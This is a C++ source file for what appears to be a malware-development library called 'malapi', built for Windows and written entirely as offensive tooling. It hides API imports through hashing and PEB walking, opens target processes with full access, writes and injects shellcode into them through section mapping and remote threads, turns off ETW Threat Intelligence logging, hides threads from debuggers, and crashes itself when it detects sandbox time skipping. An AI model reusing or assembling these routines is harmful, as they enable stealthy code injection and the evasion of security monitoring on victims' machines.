#include "malapi.hpp"

namespace malapi
{
	//
	// Uses GetFileAttributesA to check if a file exists, returns TRUE if it does.
	//
	BOOL CheckFileExists(_In_ LPCSTR FullPath)
	{
		constexpr DWORD hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		constexpr DWORD hash_getfileattributes = HashStringFowlerNollVoVariant1a("GetFileAttributes");

		HMODULE kernel32 = GetModuleHandleC(hash_kernel32);
		if (!kernel32) return NULL;
		typeGetFileAttributesA _GetFileAttributesA = (typeGetFileAttributesA)GetProcAddressC(kernel32, hash_getfileattributes);
		if (!_GetFileAttributesA) return NULL;

		DWORD attribs = _GetFileAttributesA(FullPath);
		return (attribs != INVALID_FILE_ATTRIBUTES) && !(attribs & FILE_ATTRIBUTE_DIRECTORY);
	}

	//
	// GetModuleHandle implementation with API hashing.
	//
	HMODULE GetModuleHandleC(_In_ ULONG dllHash)
	{
		PLIST_ENTRY head = (PLIST_ENTRY) & ((PPEB)__readgsqword(0x60))->Ldr->InMemoryOrderModuleList;
		PLIST_ENTRY next = head->Flink;

		PLDR_MODULE module = (PLDR_MODULE)((PBYTE)next - 16);

		while (next != head)
		{
			module = (PLDR_MODULE)((PBYTE)next - 16);
			if (module->BaseDllName.Buffer != NULL)
			{
				if (dllHash - HashStringFowlerNollVoVariant1a(module->BaseDllName.Buffer) == 0)
					return (HMODULE)module->BaseAddress;
			}
			next = next->Flink;
		}

		return NULL;
	}

	//
	// GetProcAddress implementation with API hashing.
	//
	FARPROC GetProcAddressC(_In_ HMODULE dllBase, _In_ ULONG funcHash)
	{
		PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)(dllBase);
		PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)dos + (dos)->e_lfanew);
		PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)dos + (nt)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

		if (exports->AddressOfNames != 0)
		{
			PWORD ordinals = (PWORD)((UINT_PTR)dllBase + exports->AddressOfNameOrdinals);
			PDWORD names = (PDWORD)((UINT_PTR)dllBase + exports->AddressOfNames);
			PDWORD functions = (PDWORD)((UINT_PTR)dllBase + exports->AddressOfFunctions);

			for (DWORD i = 0; i < exports->NumberOfNames; i++) {
				LPCSTR name = (LPCSTR)((UINT_PTR)dllBase + names[i]);
				if (HashStringFowlerNollVoVariant1a(name) == funcHash) {
					PBYTE function = (PBYTE)((UINT_PTR)dllBase + functions[ordinals[i]]);
					return (FARPROC)function;
				}
			}
		}
		return NULL;
	}

	//
	// Uses NtQuerySystemInformation to enumerate processes and find the first occurance in the hashlist.
	// Returns NULL on failure.
	//
	DWORD GetPidFromHashedList(_In_ DWORD* HashList, _In_ SIZE_T EntryCount)
	{
		constexpr DWORD hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr DWORD hash_ntquerysysteminformation = HashStringFowlerNollVoVariant1a("NtQuerySystemInformation");

		HMODULE ntdll = GetModuleHandleC(hash_ntdll);
		if (!ntdll) return NULL;
		typeNtQuerySystemInformation NtQuerySystemInformation = (typeNtQuerySystemInformation)GetProcAddressC(ntdll, hash_ntquerysysteminformation);
		if (!NtQuerySystemInformation) return NULL;

		DWORD pid = NULL, returnlength = 0, nextoffset = 0, name_hash = 0;
		PSYSTEM_PROCESS_INFORMATION process = NULL, processinfoptr = NULL;
		NTSTATUS status = STATUS_SUCCESS;

		// Get size of systemprocessinformation
		NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS::SystemProcessInformation, NULL, 0, &returnlength);
		returnlength += 0x10000;
		if (returnlength == 0)
			return NULL;

		process = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(returnlength);
		if (!process) return NULL;

		status = NtQuerySystemInformation(SystemProcessInformation, process, returnlength, &returnlength);
		if (!NT_SUCCESS(status))
			goto CLEANUP;

		processinfoptr = process;
		do
		{
			if (processinfoptr->ImageName.Buffer)
			{
				name_hash = HashStringFowlerNollVoVariant1a(processinfoptr->ImageName.Buffer);
				for (size_t i = 0; i < EntryCount; i++)
				{
					if (HashList[i] == name_hash)
					{
						pid = (DWORD)(UINT_PTR)processinfoptr->UniqueProcessId;
						break;
					}
				}
			}

			processinfoptr = (PSYSTEM_PROCESS_INFORMATION)(((PBYTE)processinfoptr) + processinfoptr->NextEntryOffset);
		} while (processinfoptr->NextEntryOffset);

	CLEANUP:
		if (process)
			HeapFree(process);

		return pid;
	}

	//
	// Uses OpenProcess to get a handle to the process from a given PID
	// Returns NULL on failure.
	//
	HANDLE GetProcessHandle(DWORD process_id)
	{
		HANDLE process = NULL;
		constexpr DWORD hash_krn32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		constexpr DWORD hash_openprocess = HashStringFowlerNollVoVariant1a("OpenProcess");

		HMODULE kernel32 = GetModuleHandleC(hash_krn32);
		if (!kernel32)
		{
			LOG_ERROR("GetModuleHandle failed to get kernel32.dll.");
			return NULL;
		}

		typeOpenProcess OpenProcessC = (typeOpenProcess)GetProcAddressC(kernel32, hash_openprocess);
		if (!OpenProcessC)
		{
			LOG_ERROR("GetProcAddress failed to get OpenProcess.");
			return NULL;
		}

		process = OpenProcessC(PROCESS_ALL_ACCESS, FALSE, process_id);

		LOG_SUCCESS("Process Handle: 0x%08lX", process);

		return process;
	}

	//
	// Uses VirtualAllocExNuma, VirtualProtectEx and WriteProcessMemory to write shellcode into memory
	// Returns NULL on failure.
	//
	PVOID WriteShellcodeMemory(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size)
	{
		BOOL success = FALSE;
		SIZE_T bytes_written = 0;
		PVOID address_ptr = NULL;
		HMODULE kernel32 = NULL;
		DWORD old_protection = 0;

		// typeVirtualAllocEx VirtualAllocExC = NULL;
		typeVirtualAllocExNuma VirtualAllocExNumaC = NULL;
		typeVirtualProtectEx VirtualProtectExC = NULL;
		typeWriteProcessMemory WriteProcessMemoryC = NULL;
		typeGetLastError GetLastErrorC = NULL;

		// constexpr ULONG hash_virtualallocex = malapi::HashStringFowlerNollVoVariant1a("VirtualAllocExNuma");
		constexpr ULONG hash_virtualallocexnuma = malapi::HashStringFowlerNollVoVariant1a("VirtualAllocEx");
		constexpr ULONG hash_virtualprotectex = malapi::HashStringFowlerNollVoVariant1a("VirtualProtectEx");
		constexpr ULONG hash_writeprocessmemory = malapi::HashStringFowlerNollVoVariant1a("WriteProcessMemory");
		constexpr ULONG hash_kernel32 = malapi::HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		constexpr ULONG hash_getlasterror = malapi::HashStringFowlerNollVoVariant1a("GetLastError");

		kernel32 = malapi::GetModuleHandleC(hash_kernel32);
		if (kernel32 == NULL) return NULL;

		// VirtualAllocExC = (typeVirtualAllocEx)malapi::GetProcAddressC(kernel32, hash_virtualallocex);
		VirtualAllocExNumaC = (typeVirtualAllocExNuma)malapi::GetProcAddressC(kernel32, hash_virtualallocexnuma);
		VirtualProtectExC = (typeVirtualProtectEx)malapi::GetProcAddressC(kernel32, hash_virtualprotectex);
		WriteProcessMemoryC = (typeWriteProcessMemory)malapi::GetProcAddressC(kernel32, hash_writeprocessmemory);
		GetLastErrorC = (typeGetLastError)malapi::GetProcAddressC(kernel32, hash_getlasterror);

		address_ptr = VirtualAllocExNumaC(process_handle, NULL, shellcode_size, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE, 0);
		if (address_ptr == NULL)
		{
			LOG_ERROR("Failed to allocate memory space (Code: %08lX)", GetLastErrorC());
			return NULL;
		}
		else LOG_SUCCESS("Address Pointer: 0x%08lX", address_ptr);

		success = WriteProcessMemoryC(process_handle, address_ptr, shellcode, shellcode_size, &bytes_written);
		if (!success)
		{
			LOG_ERROR("Error writing shellcode to memory (Code: %08lX)", GetLastErrorC());
			return FALSE;
		}
		else LOG_SUCCESS("Shellcode written to memory.");

		if (!VirtualProtectEx(process_handle, address_ptr, shellcode_size, PAGE_EXECUTE_READWRITE, &old_protection))
		{
			LOG_ERROR("Failed to change protection type (Code: %08lX)", GetLastErrorC());
			return FALSE;
		}
		else LOG_SUCCESS("Protection changed to RWX.");

		return address_ptr;
	}

	//
	// Get epoch timestamp (ms) from SHARED_USER_DATA
	//
	SIZE_T GetTimestamp(void)
	{
		const size_t UNIX_TIME_START = 0x019DB1DED53E8000; // Start of Unix epoch in ticks.
		const size_t TICKS_PER_MILLISECOND = 10000; // A tick is 100ns.
		LARGE_INTEGER time;
		time.LowPart = *(DWORD*)(0x7FFE0000 + 0x14); // Read LowPart as unsigned long.
		time.HighPart = *(long*)(0x7FFE0000 + 0x1c); // Read High1Part as long.
		return (unsigned long long)((time.QuadPart - UNIX_TIME_START) / TICKS_PER_MILLISECOND);
	}

	//
	// Sleep implementation using `get_timestamp`,
	// will crash the process if time skipping is detected.
	//
	void SleepMs(_In_ SIZE_T Ms)
	{
		volatile size_t x = 0;
		size_t end_time = GetTimestamp() + Ms;
		while (GetTimestamp() < end_time) x += 1;

		// time skip check (crash process if so)
		if (GetTimestamp() > end_time + 1000)
		{
			volatile size_t crash = 0;
			x = *(int*)crash;
		}
	}

	//
	// Returns handle to current process' heap.
	//
	HANDLE GetProcessHeap(void)
	{
		return reinterpret_cast<HANDLE>(GetTEB()->ProcessEnvironmentBlock->ProcessHeap);
	}

	//
	// Returns TEB pointer for current process.
	//
	PTEB GetTEB(void)
	{
		PTEB teb;
#ifdef _WIN64
		teb = reinterpret_cast<PTEB>(__readgsqword(0x30));
#else
		teb = reinterpret_cast<PTEB>(__readfsdword(0x18));
#endif
		return teb;
	}

	//
	// Returns PEB pointer for current process.
	//
	PPEB GetPEB(void)
	{
		PPEB peb;
#ifdef _WIN64
		peb = reinterpret_cast<PPEB>(__readgsqword(0x60));
#else
		peb = reinterpret_cast<PPEB>(__readfsdword(0x30));
#endif
		return peb;
	}

	//
	// Abuse a bug to disable ETW-Ti for a target process.
	// More info: https://www.legacyy.xyz/defenseevasion/windows/2024/04/24/disabling-etw-ti-without-ppl.html
	//
	BOOL DisableETWTi(_In_ HANDLE TargetProcess)
	{
		constexpr ULONG hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr ULONG hash_ntsetinformationprocess = HashStringFowlerNollVoVariant1a("NtSetInformationProcess");

		HMODULE ntdll = GetModuleHandleC(hash_ntdll);
		if (!ntdll) return FALSE;
		typeNtSetInformationProcess NtSetInformationProcess = (typeNtSetInformationProcess)GetProcAddressC(ntdll, hash_ntsetinformationprocess);
		if (!NtSetInformationProcess) return FALSE;

		// Prepare for NtSetInformationProcess
		PROCESS_LOGGING_INFORMATION pli = { 0 };
		pli.Flags = (ULONG)0xf;
		pli.EnableReadVmLogging = 0;
		pli.EnableWriteVmLogging = 0;
		pli.EnableProcessSuspendResumeLogging = 0;
		pli.EnableThreadSuspendResumeLogging = 0;
		pli.Reserved = 26;

		NTSTATUS status = NtSetInformationProcess(
			TargetProcess,
			ProcessEnableLogging,
			&pli,
			sizeof(_PROCESS_LOGGING_INFORMATION));

		return NT_SUCCESS(status);
	}

	//
	// Returns PEB pointer for current process. (Retrieved from TEB)
	//
	PPEB GetPEBFromTEB(void)
	{
		PPEB peb;
#ifdef _WIN64
		peb = reinterpret_cast<PTEB>(__readgsqword(0x30))->ProcessEnvironmentBlock;
#else
		peb = reinterpret_cast<PTEB>(__readfsdword(0x18))->processEnvironmentBlock;
#endif
		return peb;
	}

	//
	// Search a region of memory for an egg. Returns NULL on failure.
	//
	PVOID EggHunt(_In_ PVOID RegionStart, _In_ SIZE_T RegionLength, _In_ PVOID Egg, _In_ SIZE_T EggLength)
	{
		if (!RegionStart || !RegionLength || !Egg || !EggLength)
			return NULL;

		for (CHAR* pchar = (CHAR*)RegionStart; RegionLength >= EggLength; ++pchar, --RegionLength)
		{
			if (!memcmp(pchar, Egg, EggLength))
				return pchar;
		}
		return NULL;
	}

	//
	// Allocate a block of memory in the current process' heap.
	// Returns a pointer to the allocated block, or NULL on failure.
	//
	PVOID HeapAlloc(_In_ SIZE_T Size)
	{
		constexpr ULONG hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr ULONG hash_rtlallocateheap = HashStringFowlerNollVoVariant1a("RtlAllocateHeap");

		HMODULE ntdll = GetModuleHandleC(hash_ntdll);
		if (!ntdll) return NULL;
		typeRtlAllocateHeap RtlAllocateHeap = (typeRtlAllocateHeap)GetProcAddressC(ntdll, hash_rtlallocateheap);
		if (!RtlAllocateHeap) return NULL;

		// RtlAllocateHeap returns NULL on failure so no need to add error handling.
		return RtlAllocateHeap(GetProcessHeap(), HEAP_ZERO_MEMORY, Size);
	}

	//
	// Free a block of memory in the current process' heap.
	// Returns TRUE on success, FALSE on failure.
	//
	BOOL HeapFree(_In_ PVOID BlockAddress)
	{
		constexpr ULONG hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr ULONG hash_rtlfreeheap = HashStringFowlerNollVoVariant1a("RtlFreeHeap");

		HMODULE ntdll = GetModuleHandleC(hash_ntdll);
		if (!ntdll) return NULL;
		typeRtlFreeHeap RtlFreeHeap = (typeRtlFreeHeap)GetProcAddressC(ntdll, hash_rtlfreeheap);
		if (!RtlFreeHeap) return NULL;

		return RtlFreeHeap(GetProcessHeap(), NULL, BlockAddress) ? TRUE : FALSE;
	}

	//
	// Hide a given thread from the debugger by setting THREAD_INFO_CLASS::ThreadHideFromDebugger
	// Defaults to current thread unless specified otherwise.
	//
	VOID HideFromDebugger(_In_ HANDLE ThreadHandle)
	{
		constexpr DWORD hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr DWORD hash_ntsetinformationthread = HashStringFowlerNollVoVariant1a("NtSetInformationThread");

		HMODULE ntdll = GetModuleHandleC(hash_ntdll);
		if (!ntdll) return;
		typeNtSetInformationThread NtSetInformationThread = (typeNtSetInformationThread)GetProcAddressC(ntdll, hash_ntsetinformationthread);
		if (!NtSetInformationThread) return;

		NtSetInformationThread(ThreadHandle, ThreadHideFromDebugger, NULL, 0);
		return;
	}

	//
	// Inject shellcode into a target process via NtCeationSection -> NtMapViewOfSection -> RtlCreateUserThread.
	//
	VOID InjectionNtMapViewOfSection(_In_ HANDLE ProcessHandle, BYTE* Shellcode, SIZE_T ShellcodeLength)
	{
		constexpr DWORD hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr DWORD hash_ntcreatesection = HashStringFowlerNollVoVariant1a("NtCreateSection");
		constexpr DWORD hash_ntmapviewofsection = HashStringFowlerNollVoVariant1a("NtMapViewOfSection");
		constexpr DWORD hash_rtlcreateuserthread = HashStringFowlerNollVoVariant1a("RtlCreateUserThread");

		HMODULE ntdll = GetModuleHandleC(hash_ntdll);
		if (!ntdll) return;

		typeNtCreateSection NtCreateSection = (typeNtCreateSection)GetProcAddressC(ntdll, hash_ntcreatesection);
		typeNtMapViewOfSection NtMapViewOfSection = (typeNtMapViewOfSection)GetProcAddressC(ntdll, hash_ntmapviewofsection);
		typeRtlCreateUserThread RtlCreateUserThread = (typeRtlCreateUserThread)GetProcAddressC(ntdll, hash_rtlcreateuserthread);
		if (!NtCreateSection || !NtMapViewOfSection || !RtlCreateUserThread) return;

		LARGE_INTEGER section_size = { 0 };
		HANDLE section_handle = NULL, target_thread = NULL;
		PVOID addr_local_section = NULL, addr_remote_section = NULL;
		section_size.QuadPart = ShellcodeLength;

		// Create memory section.
		NtCreateSection(
			&section_handle,
			SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
			NULL,
			&section_size,
			PAGE_EXECUTE_READWRITE,
			SEC_COMMIT | SEC_RESERVE, // Unsure if SEC_RESERVE is needed here.
			NULL
		);

		// Map the section to local process (RW)
		NtMapViewOfSection(
			section_handle,
			(HANDLE)-1,
			&addr_local_section,
			NULL,
			NULL,
			NULL,
			&ShellcodeLength,
			SECTION_INHERIT::ViewUnmap,
			NULL,
			PAGE_READWRITE
		);

		// Map the section to target process (RX)
		NtMapViewOfSection(
			section_handle,
			ProcessHandle,
			&addr_remote_section,
			NULL,
			NULL,
			NULL,
			&ShellcodeLength,
			SECTION_INHERIT::ViewUnmap,
			NULL,
			PAGE_EXECUTE_READ
		);

		// Copy shellcode to mapped view.
		memcpy(addr_local_section, Shellcode, ShellcodeLength);

		// Create thread.
		RtlCreateUserThread(
			ProcessHandle,
			NULL,
			FALSE,
			0,
			0,
			0,
			(PUSER_THREAD_START_ROUTINE)addr_remote_section,
			NULL,
			&target_thread,
			NULL
		);
	}

	//
	// Returns TRUE if current process token is elevated, otherwise FALSE (including on error).
	//
	BOOL IsProcessRunningAsAdmin(void)
	{
		HANDLE hToken = NULL;
		TOKEN_ELEVATION Elevation = { 0 };
		DWORD dwSize = 0;
		BOOL bFlag = FALSE;
		typeOpenProcessToken pOpenProcessToken;
		typeGetTokenInformation pGetTokenInformation;

		constexpr DWORD hashadvapi = HashStringFowlerNollVoVariant1a("Advapi32.dll");
		constexpr DWORD hashopenprocesstoken = HashStringFowlerNollVoVariant1a("OpenProcessToken");
		constexpr DWORD hashgettokeninformation = HashStringFowlerNollVoVariant1a("GetTokenInformation");

		HMODULE advapi = GetModuleHandleC(hashadvapi);
		if (!advapi) goto EXIT_ROUTINE;

		pOpenProcessToken = (typeOpenProcessToken)GetProcAddressC(advapi, hashopenprocesstoken);
		pGetTokenInformation = (typeGetTokenInformation)GetProcAddressC(advapi, hashgettokeninformation);

		if (!pOpenProcessToken || !pGetTokenInformation)
			goto EXIT_ROUTINE;

		if (!pOpenProcessToken((HANDLE)(UINT_PTR)-1, TOKEN_QUERY, &hToken))
			goto EXIT_ROUTINE;

		if (!pGetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &dwSize))
			goto EXIT_ROUTINE;

		bFlag = TRUE;

	EXIT_ROUTINE:
		if (hToken)
			CloseHandle(hToken);

		return (bFlag ? Elevation.TokenIsElevated : FALSE);
	}

	//
	// memcmp
	//
	INT memcmp(const void* s1, const void* s2, size_t n)
	{
		const unsigned char* p1 = (const unsigned char*)s1;
		const unsigned char* end1 = p1 + n;
		const unsigned char* p2 = (const unsigned char*)s2;
		int                  d = 0;
		for (;;) {
			if (d || p1 >= end1) break;
			d = (int)*p1++ - (int)*p2++;
			if (d || p1 >= end1) break;
			d = (int)*p1++ - (int)*p2++;
			if (d || p1 >= end1) break;
			d = (int)*p1++ - (int)*p2++;
			if (d || p1 >= end1) break;
			d = (int)*p1++ - (int)*p2++;
		}
		return d;
	}

	//
	// memcpy implementation.
	//
#if _WINDLL == 0 && !_DEBUG
#pragma intrinsic(memcpy)
#pragma function(memcpy)
	void* __cdecl memcpy(void* dst, void const* src, size_t size) {
		for (volatile int i = 0; i < size; i++) {
			((BYTE*)dst)[i] = ((BYTE*)src)[i];
		}
		return dst;
	}

	//
	// memset implementation.
	//
#pragma intrinsic(memset)
#pragma function(memset)
	void* __cdecl memset(void* pTarget, int value, size_t cbTarget) {
		unsigned char* p = (unsigned char*)pTarget;
		while (cbTarget-- > 0) {
			*p++ = (unsigned char)value;
		}
		return pTarget;
	}
#endif

	//
	// String compare implementation (ascii).
	//
	INT StringCompare(_In_ LPCSTR String1, _In_ LPCSTR String2)
	{
		for (; *String1 == *String2; String1++, String2++)
		{
			if (*String1 == '\0')
				return 0;
		}

		return ((*(LPCSTR)String1 < *(LPCSTR)String2) ? -1 : +1);
	}
	//
	// String compare implementation (wchar).
	//
	INT StringCompare(_In_ LPCWSTR String1, _In_ LPCWSTR String2)
	{
		for (; *String1 == *String2; String1++, String2++)
		{
			if (*String1 == '\0')
				return 0;
		}

		return ((*(LPCWSTR)String1 < *(LPCWSTR)String2) ? -1 : +1);
	}

	//
	// Secure strcpy implementation (ascii).
	//
	PCHAR SecureStringCopy(_Inout_ PCHAR String1, _In_ LPCSTR String2, _In_ SIZE_T Size)
	{
		PCHAR pChar = String1;

		while (Size-- && (*String1++ = *String2++) != '\0');

		return pChar;
	}
	//
	// Secure strcpy implementation (wchar).
	//
	PWCHAR SecureStringCopy(_Inout_ PWCHAR String1, _In_ LPCWSTR String2, _In_ SIZE_T Size)
	{
		PWCHAR pChar = String1;

		while (Size-- && (*String1++ = *String2++) != '\0');

		return pChar;
	}

	//
	// String copy implementation (ascii).
	//
	PCHAR StringCopy(_Inout_ PCHAR String1, _In_ LPCSTR String2)
	{
		PCHAR p = String1;

		while ((*p++ = *String2++) != 0);

		return String1;
	}
	//
	// String copy implementation (wchar).
	//
	PWCHAR StringCopy(_Inout_ PWCHAR String1, _In_ LPCWSTR String2)
	{
		PWCHAR p = String1;

		while ((*p++ = *String2++) != 0);

		return String1;
	}

	//
	// XORs input with a given key, will repeat the key if KeyLen < InputLen.
	//
	VOID XOR(_Inout_ BYTE* Input, _In_ SIZE_T InputLen, _In_ BYTE* Key, _In_ SIZE_T KeyLen)
	{
		for (SIZE_T i = 0; i < InputLen; i++)
			Input[i] ^= Key[i % KeyLen];
	}

	//
	// Zero a region of memory.
	//
	VOID ZeroMemoryEx(_Inout_ PVOID Destination, _In_ SIZE_T Size)
	{
		PULONG Dest = (PULONG)Destination;
		SIZE_T Count = Size / sizeof(ULONG);

		while (Count > 0)
		{
			*Dest = 0;
			Dest++;
			Count--;
		}

		return;
	}
}
